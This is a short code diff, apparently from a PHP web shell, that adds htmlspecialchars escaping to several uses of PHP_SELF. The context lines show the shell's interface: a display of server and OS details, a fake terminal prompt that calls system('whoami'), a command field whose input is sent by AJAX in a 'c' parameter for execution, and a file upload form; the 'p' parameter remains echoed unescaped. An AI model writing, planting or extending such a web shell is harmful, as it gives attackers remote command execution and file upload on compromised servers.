@@ -46,7 +46,7 @@
                 <span class="font-weight-bold">PHP Version : </span><p class="text-muted"><?= PHP_VERSION ?></p>
                 <span class="font-weight-bold">OS : </span><p class="text-muted"><?= PHP_OS ?></p>
                 <span class="font-weight-bold">Server Info : </span><p class="text-muted"><?= php_uname() ?> </p>
-                <span class="font-weight-bold">Shell Path : </span><p class="text-muted "><?= getcwd().$_SERVER['PHP_SELF'] ?> </p>
+                <span class="font-weight-bold">Shell Path : </span><p class="text-muted "><?= getcwd().htmlspecialchars($_SERVER['PHP_SELF']) ?> </p>
             </div>
             <div class="input-group mx-auto w-50">
                 <span class="text-success"><span class="text-danger">┌─[<?php system('whoami') ?><span class="text-info">@</span><?= $_SERVER['SERVER_ADDR'] ?>]─[<span class="text-success">~</span>]<br>└──╼ </span><span class="text-warning">$</span> <input type="text" class="command text-success" autofocus></span>
@@ -55,7 +55,7 @@
             <textarea class="res text-success border-0 rounded h-50 noresize" readonly></textarea>
             </div>
         </div>
-        <form class="form fixed-top" action="<?= $_SERVER['PHP_SELF'] ?>?p=<?= $_GET['p'] ?>" method="post" enctype="multipart/form-data">
+        <form class="form fixed-top" action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>?p=<?= $_GET['p'] ?>" method="post" enctype="multipart/form-data">
             <div class="input-group my-3 mx-auto w-50">
                 <input type="file" class="btn btn-light text-dark" name="file[]" required="true">
             <div class="input-group-append">
@@ -70,7 +70,7 @@
                 var c = $('.command').val();
                 if(!c) return false;
                 $.ajax({
-                    url: '<?= $_SERVER['PHP_SELF'] ?>?p=<?= $_GET['p'] ?>&c='+c,
+                    url: '<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>?p=<?= $_GET['p'] ?>&c='+c,
                     method: 'get',
                     success: function(data) {
                         $('.res').html(data);
